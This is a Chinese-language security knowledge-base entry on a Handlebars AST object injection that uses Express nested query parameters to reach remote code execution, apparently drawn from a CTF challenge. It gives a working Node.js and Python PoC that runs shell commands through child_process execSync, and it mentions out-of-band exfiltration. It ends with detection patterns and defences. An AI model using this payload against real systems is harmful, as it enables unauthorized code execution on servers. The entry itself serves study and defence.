---
id: web-nodejs-ssti-handlebars-ast-injection
title: Handlebars 编译 AST 对象注入导致模板代码执行
type: scenario
domain: web
path: web/nodejs/ssti
technique: handlebars-ast-object-injection-rce
tags:
- nodejs
- handlebars
- ssti
- ast-injection
- express
- rce
- type-confusion
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T01:55:12+08:00'
  notes: 已对照原文与唯一图片核对：compile 接受 type=Program 对象、parseWithoutProcessing 原样返回 Program、NumberLiteral.value 经 pushLiteral 拼入生成代码、Express x[a][b]=v 嵌套参数完成类型混淆；图01 显示先输出 hack 再抛 helper-missing 异常，证实代码执行。原文未给出 handlebars 具体版本（仅称最新版），未设 versions。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/nodejs/ssti/web-nodejs-ssti-handlebars-ast-injection/
draft: false
kb_aliases:
- Handlebars AST 注入
- Handlebars.compile 对象注入
- NumberLiteral value 代码注入
- Express query 对象解析
- DownUnderCTF 2025 handlebars
---

## 一句话结论

`Handlebars.compile()` 除字符串外还接受 `type: "Program"` 的 AST 对象，且 `parseWithoutProcessing` 会原样返回传入的 AST；攻击者通过 Express 的 `x[type]=...` 查询参数构造恶意 AST，把 `NumberLiteral.value` 写成任意 JavaScript 表达式，编译时该值被直接拼进生成代码并执行，即使是最新版本 Handlebars 也能 RCE。

## 原理

- `Handlebars.compile(input, options, env)` 的类型检查只要求 `input` 是字符串或 `input.type === 'Program'`，因此对象形式的 AST 是合法输入。
- `parseWithoutProcessing()` 中：
  ```js
  if (input.type === 'Program') return input;
  ```
  传入的 Program 对象被原样返回，跳过词法/语法解析与结构校验；随后进入 `Compiler.compile(ast)` 与 `JavaScriptCompiler.compile()`。
- 编译器按节点的 `type` 分发，例如 `MustacheStatement` 会处理 `params`；`pushParam` 对每个参数调用 `accept(val)`，再由 `accept` 调用 `this[node.type]`。`NumberLiteral` 的处理是 `this.opcode('pushLiteral', number.value)`，不做任何类型或转义检查。
- `pushLiteral` 的 `value` 最终由 `JavaScriptCompiler` 拼接进生成的模板函数源码。正常情况是数字字面量；当 `value` 是字符串时，它会被当作代码片段写入，攻击者用 `function(){...}()` 之类的表达式闭合上下文即可在模板函数执行时运行任意 JS。
- Express 默认查询解析器支持 `x[a][b]=v` 形式，`req.query.x` 因此可以是任意嵌套对象，而不是字符串；应用若把 `req.query.x` 直接传给 `Handlebars.compile`，就完成了从 HTTP 参数到 AST 对象的类型混淆。
- 攻击不依赖模板 helper 或旧版 SSTI 漏洞；是 `compile` 的 AST 输入面与字面量拼接缺少校验导致的代码注入。

## 触发条件

- 应用把用户可控数据直接传给 `Handlebars.compile(...)`，且该数据可以是对象（Express `req.query.x`、JSON body 等）。
- 应用没有对输入做 `typeof === 'string'` 校验。
- Handlebars 版本允许 AST 对象输入（当前版本均如此，属于设计功能）。
- 生成的模板函数会被执行（通常紧随 `compile(...)(context)`）。

## 利用步骤

1. 确认参数是直接进入 `Handlebars.compile`，且可以传对象；用 `x[type]=Program` 观察是否报 AST 相关错误。
2. 构造最小 Program AST：一个 `MustacheStatement`，`params` 中放一个 `NumberLiteral`，其 `value` 为要执行的 JS 表达式。
3. 用 Express 的嵌套查询语法把对象字段逐个传入；`path`、`loc` 等字段可给最简单的值。
4. 触发模板执行，JS 表达式在编译/运行阶段执行；无回显时通过外带、写文件或把结果放进异常消息。

## PoC

最小 Node.js 复现：

```js
const Handlebars = require("handlebars");
const ast = {
  type: "Program",
  body: [{
    type: "MustacheStatement",
    path: 0,
    params: [{
      type: "NumberLiteral",
      value: "function () {console.log('hack')}()"
    }],
    loc: { start: 0, end: 0 }
  }]
};
Handlebars.compile(ast)({});
```

HTTP 利用（目标代码为 `res.send(Handlebars.compile(req.query.x)({}))`）：

```python
import requests
requests.get("http://target:8000/", params={
    "x[type]": "Program",
    "x[body][0][type]": "MustacheStatement",
    "x[body][0][path]": "0",
    "x[body][0][loc][start]": "0",
    "x[body][0][loc][end]": "0",
    "x[body][0][params][0][type]": "NumberLiteral",
    "x[body][0][params][0][value]":
        "function () {throw new Error(process.mainModule.require('child_process').execSync('/getflag').toString())}()",
})
```

把命令输出放进异常消息，便于在错误响应中回显；无回显时改为写文件或 DNS/HTTP 外带。

## 变体与关联

- 变体：`value` 中可直接执行 `process.mainModule.require('child_process').execSync('id')`；Node 版本/模块模式下 `require` 不可用时可通过 `process`、`global` 寻找模块加载入口。
- 变体：其他被当作字面量拼接的 AST 节点字段也可能存在同类注入，需审计 `pushLiteral` 及相关 opcode。
- 变体：参数来源可以是 JSON body、模板缓存/数据库中的 AST 对象等任何能把对象送入 `compile` 的路径。
- 关联：[[web-generic-ssti-engine-identification-decision-tree-errors]]（模板引擎识别与报错特征）。
- 关联：[[web-generic-ssti-twig-filter-map-reduce-callback-rce]]（另一类把可控字面量/回调变成代码执行的模板引擎问题）。
- 边界：应用先校验 `typeof input === 'string'`、只编译固定模板、或对传入对象做结构化白名单时，该链不成立。

## 检测与防御

- 检测：查询串/JSON 中出现 `type=Program`、`body[0][type]=MustacheStatement`、`params[0][type]=NumberLiteral`、`value=function` 等嵌套对象参数；Handlebars 编译异常栈出现 `parseWithoutProcessing`/`helper-missing` 且伴随可疑参数。
- 防御：传给 `Handlebars.compile` 的必须是字符串，显式校验 `typeof req.query.x !== 'string'` 并拒绝对象。
- 加固：预编译固定模板，运行时只传 context；不要接受用户提供的 AST；对查询参数做扁平化/类型约束，关闭不必要的嵌套参数解析。
